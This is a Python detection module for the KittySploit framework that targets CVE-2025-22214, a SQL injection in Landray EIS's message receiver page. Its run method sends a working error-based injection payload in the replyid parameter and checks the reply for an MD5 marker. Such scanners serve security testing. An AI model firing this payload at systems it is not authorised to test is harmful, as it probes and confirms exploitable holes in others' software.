#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Landray EIS 2001 through 2006 contains a SQL injection caused by unsanitized input in Message/fi_message_recei."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Landray EIS SQL注入漏洞 Detection',
        'description': 'Landray EIS 2001 through 2006 contains a SQL injection caused by unsanitized input in Message/fi_message_receiver.aspx?replyid=, letting attackers execute arbitrary SQL commands, exploit requires crafted input.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'landray', 'sqli', 'intrusive', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2025-22214'],
        'cve': 'CVE-2025-22214',
    }

    def run(self):
        path = "/Message/fi_message_receiver.aspx?replyid=1%20and%201=CONVERT(VARCHAR(32),HASHBYTES('MD5','123'),2)--+"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        body_all = ('202CB962AC59075B964B07152D234B70', 'varchar', 'Landray',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Landray EIS SQL注入漏洞 detected', path=path)
            return True
        return False

